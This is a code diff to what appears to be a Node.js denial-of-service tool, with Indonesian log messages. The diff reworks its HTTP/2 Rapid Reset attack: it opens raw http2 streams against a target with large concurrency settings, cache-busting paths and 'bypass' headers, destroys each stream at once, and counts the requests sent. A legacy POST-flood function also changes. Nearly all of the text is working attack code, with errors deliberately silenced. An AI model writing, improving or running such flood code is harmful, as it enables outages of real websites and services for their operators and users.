@@ -3,6 +3,7 @@ const os = require('os');
 const http = require('http'); // Diperlukan untuk agent kustom
 const https = require('https'); // Diperlukan untuk agent kustom
 const got = require('got');
+const http2 = require('http2');
 const { CookieJar } = require('tough-cookie');
 const url = require('url');
 const crypto = require('crypto');
@@ -100,33 +101,39 @@ function executeHttp2Attack(targetUrl, durationSeconds) { // This function runs 
     const reportAfterLoops = 1000; // Send stats to master every 1000 loops (500,000 requests) for accuracy
 
     const target = url.parse(targetUrl);
-    const cookieJar = new CookieJar();
+    const authority = `${target.protocol}//${target.host}`;
 
-    console.log(`Worker ${process.pid} memulai serangan HTTP/2 Rapid Reset ke ${target.host} selama ${durationSeconds} detik.`);
+    console.log(`Worker ${process.pid} memulai serangan HTTP/2 Rapid Reset ke ${authority} selama ${durationSeconds} detik.`);
+
+    const client = http2.connect(authority, {
+        settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 1000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 262144,
+        }
+    });
+    client.on('error', () => {});
+    client.on('socketError', () => {});
 
     let isAttackActive = true;
  
     const attack = () => {
-        const cacheBustingUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`;
-        const request = got(cacheBustingUrl, {
-            http2: true,
-            headers: getBypassHeaders(),
-            timeout: 10000,
-            retry: 0,
-            cookieJar: cookieJar
-        });
+        const headers = getBypassHeaders();
+        headers[http2.constants.HTTP2_HEADER_METHOD] = 'GET';
+        headers[http2.constants.HTTP2_HEADER_PATH] = `${target.path || '/'}${target.path && target.path.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`;
+        headers[http2.constants.HTTP2_HEADER_SCHEME] = target.protocol.replace(':', '');
+        headers[http2.constants.HTTP2_HEADER_AUTHORITY] = target.host;
 
-        request.on('request', (req) => {
-            req.destroy();
-        });
+        const stream = client.request(headers);
+        stream.on('error', () => {});
 
         localSent++;
-        // Error diharapkan terjadi pada serangan rapid reset, jadi tidak dihitung.
-        request.catch(() => {});
+        stream.destroy();
     };
  
     const attackLoop = () => {
-        if (isAttackActive) {
+        if (isAttackActive && !client.destroyed) {
             for (let i = 0; i < streamsPerLoop; i++) {
                 attack();
             }
@@ -163,7 +170,10 @@ function executeHttp2Attack(targetUrl, durationSeconds) { // This function runs 
             });
         }
 
-        console.log(`Worker ${process.pid} telah menghentikan serangan ke ${target.host}.`);
+        if (!client.destroyed) {
+            client.destroy();
+        }
+        console.log(`Worker ${process.pid} telah menghentikan serangan ke ${authority}.`);
         process.exit(0);
     }, durationSeconds * 1000);
 }
@@ -191,6 +201,7 @@ function executeLegacyAttack(targetUrl, durationSeconds) {
         const cacheBustingUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`;
         const payload = getRandomPayload();
         const headers = getBypassHeaders();
+        headers['Content-Type'] = 'application/json';
         
         localSent++;
         got.post(cacheBustingUrl, {
